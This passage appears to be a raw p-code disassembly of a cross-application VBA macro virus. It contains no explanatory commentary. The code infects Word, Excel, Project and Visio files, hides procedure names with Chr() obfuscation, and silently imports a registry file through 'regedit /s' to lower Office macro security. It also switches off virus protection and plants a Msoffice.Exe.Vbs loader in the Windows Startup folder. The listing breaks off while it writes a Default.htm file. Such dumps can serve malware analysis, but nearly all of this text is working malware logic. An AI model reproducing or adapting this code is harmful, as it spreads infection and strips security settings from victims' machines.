' 	MemLd countoflines 
' 	Ld aktiv 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #86:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nom 
' 	MemLd countoflines 
' 	Ld nom 
' 	ArgsMemLd Lines 0x0002 
' 	Ld aktiv 
' 	ArgsMemCall InsertLines 0x0002 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	LineNum 12 
' 	BoS 0x0000 
' Line #89:
' 	Ld act 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld aktiv 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #90:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 16 
' 	EndIf 
' Line #93:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	Ne 
' 	IfBlock 
' Line #94:
' 	Ld t 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	IfBlock 
' Line #95:
' 	Ld Excel 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #96:
' 	LitStr 0x000B "c:\expo.exp"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #97:
' 	LitDI2 0x000A 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld aktiv 
' 	ArgsMemCall replaceline 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0015 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld aktiv 
' 	ArgsMemCall replaceline 0x0002 
' Line #98:
' 	LitDI2 0x000D 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld aktiv 
' 	ArgsMemCall replaceline 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x002C 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld aktiv 
' 	ArgsMemCall replaceline 0x0002 
' Line #99:
' 	LitDI2 0x0031 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld aktiv 
' 	ArgsMemCall replaceline 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0050 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld aktiv 
' 	ArgsMemCall replaceline 0x0002 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0002 
' 	Ld aktiv 
' 	MemLd countoflines 
' 	Ld aktiv 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #103:
' 	LineNum 16 
' 	BoS 0x0000 
' Line #104:
' 	Ld t 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #105:
' 	Ld t 
' 	LitStr 0x0011 "Microsoft Project"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #106:
' 	Ld tune 
' 	LitStr 0x0005 "Micro"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #107:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #108:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlapp 
' Line #109:
' 	Ld xlapp 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	Ne 
' 	If 
' 	Else 
' 	BoSImplicit 
' 	GoTo fl 
' 	EndIf 
' Line #110:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0044 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\MicrosoftExcel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #111:
' 	SetStmt 
' 	Ld xlapp 
' 	MemLd Workbooks 
' 	Set bko 
' Line #112:
' 	SetStmt 
' 	Ld bko 
' 	MemLd Add 
' 	Set bkobj 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #113:
' 	ParamOmitted 
' 	LitDI2 0x0001 
' 	Ld nom 
' 	MemLd countoflines 
' 	Ld nom 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld bkobj 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines1 0x0002 
' Line #114:
' 	ParamOmitted 
' 	LitStr 0x0019 "Sub Workbook_Deactivate()"
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld bkobj 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline1 0x0002 
' Line #115:
' 	Ld xlapp 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	Ld bkobj 
' 	ArgsMemCall SaveAs 0x0001 
' Line #116:
' 	Ld bkobj 
' 	ArgsMemCall Close 0x0000 
' 	BoS 0x0000 
' 	Ld xlapp 
' 	ArgsMemCall Quit 0x0000 
' Line #117:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitStr 0x0011 "Microsoft Project"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #118:
' 	LitDI2 0x000A 
' 	LitStr 0x0001 "'"
' 	Ld m 
' 	Ld bkobj 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #119:
' 	LitDI2 0x000D 
' 	LitStr 0x0001 "'"
' 	Ld m 
' 	Ld bkobj 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #120:
' 	LitDI2 0x0015 
' 	LitStr 0x0001 "'"
' 	Ld m 
' 	Ld bkobj 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	LitStr 0x0014 "c:\Windows\stray.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0047 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft"
' 	PrintItemNL 
' Line #126:
' 	Reparse 0x0007 "Excel]""
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\MS Project\Security]"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #137:
' 	LitStr 0x001F "regedit /s c:\Windows\stray.reg"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	Label fl 
' Line #141:
' 	LitStr 0x000D "c:\gotvis.dll"
' 	ArgsLd Dir 0x0001 
' 	St fi 
' Line #142:
' 	Ld fi 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St dovis 
' 	EndIf 
' Line #143:
' 	Ld tune 
' 	LitStr 0x0005 "Micro"
' 	Eq 
' 	Ld dovis 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #144:
' 	SetStmt 
' 	Ld mut$ 
' 	ArgsLd CreateObject 0x0001 
' 	Set vsapp 
' Line #145:
' 	SetStmt 
' 	Ld mat$ 
' 	Ld vsapp 
' 	MemLd Documents 
' 	ArgsMemLd Add 0x0001 
' 	Set vs1obj 
' Line #146:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld vs1obj 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set la 
' Line #147:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nom 
' 	MemLd countoflines 
' 	Ld nom 
' 	ArgsMemLd Lines 0x0002 
' 	Ld la 
' 	ArgsMemCall InsertLines 0x0002 
' Line #148:
' 	LitDI2 0x0001 
' 	LitStr 0x003E "Sub Document_BeforeDocumentClose(ByValdoc As Visio.IVDocument)"
' 	LitDI2 0x0001 
' 	Ld vs1obj 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #149:
' 	LitDI2 0x002C 
' 	LitStr 0x002C "ThisDocument.saveasex fila$, visSaveAsWS = 2"
' 	LitDI2 0x0001 
' 	Ld vs1obj 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #150:
' 	LitDI2 0x0031 
' 	LitStr 0x0037 "vs1obj.VBProject.VBComponents(1).codemodule.Replaceline"
' 	LitDI2 0x0001 
' 	Ld vs1obj 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #151:
' 	LitStr 0x0032 "C:\Program Files\Visio\Solutions\Blank Drawing.vst"
' 	Paren 
' 	St fila$ 
' Line #152:
' 	Ld fila$ 
' 	Ld visSaveAsWS 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld vs1obj 
' 	ArgsMemCall SaveAsEx 0x0002 
' Line #153:
' 	Ld vs1obj 
' 	ArgsMemCall Close 0x0000 
' Line #154:
' 	Ld vsapp 
' 	ArgsMemCall Close 0x0000 
' Line #155:
' 	LitStr 0x000D "c:\gotvis.dll"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "'"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #156:
' 	EndIfBlock 
' Line #157:
' Line #158:
' 	Ld t 
' 	LitStr 0x0011 "Microsoft Project"
' 	Ne 
' 	IfBlock 
' Line #159:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0015 "MSProject.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set projobj 
' Line #160:
' 	Ld projobj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nopro 
' 	EndIf 
' Line #161:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld projobj 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set proj1obj 
' Line #162:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nom 
' 	MemLd countoflines 
' 	Ld nom 
' 	ArgsMemLd Lines 0x0002 
' 	Ld proj1obj 
' 	ArgsMemCall InsertLines 0x0002 
' Line #163:
' 	LitDI2 0x0001 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld proj1obj 
' 	ArgsMemCall replaceline 0x0002 
' Line #164:
' 	LitDI2 0x000A 
' 	LitStr 0x0028 "Application.MacroVirusProtection = False"
' 	Ld proj1obj 
' 	ArgsMemCall replaceline 0x0002 
' Line #165:
' 	LitDI2 0x000D 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0058 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld proj1obj 
' 	ArgsMemCall replaceline 0x0002 
' Line #166:
' 	LitDI2 0x0015 
' 	LitStr 0x002F "Application.FileSaveAs Name:=ActiveProject.Name"
' 	Ld proj1obj 
' 	ArgsMemCall replaceline 0x0002 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	Label nopro 
' Line #169:
' 	LitStr 0x0037 "c:\Windows\Start Menu\Programs\Startup\Msoffice.Exe.Vbs"
' 	ArgsLd Dir 0x0001 
' 	St Pi 
' Line #170:
' 	Ld Pi 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0037 "c:\Windows\Start Menu\Programs\Startup\Msoffice.Exe.Vbs"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' 	EndIf 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Call BulletLoader"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "Sub Bulletloader()"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Set wo = CreateObject("word.application")"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0042 "wo.NormalTemplate.VBProject.VBComponents(1).codemodule.deletelines"
' 	PrintItemSemi 
' 	LitDI2 0x0001 
' 	PrintItemComma 
' 	LitDI2 0x0001 
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "wo.Options.VirusProtection = (Rnd * 0)"
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "wo.Options.SaveNormalPrompt = (Rnd * 0)"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.AddFromFile"
' 	PrintItemSemi 
' 	LitStr 0x000C "c:\expo.exp""
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "wo.NormalTemplate.Save"
' 	PrintItemNL 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "wo.Quit"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #176:
' 	LitStr 0x0016 "C:\Windows\Default.htm"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<html>"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
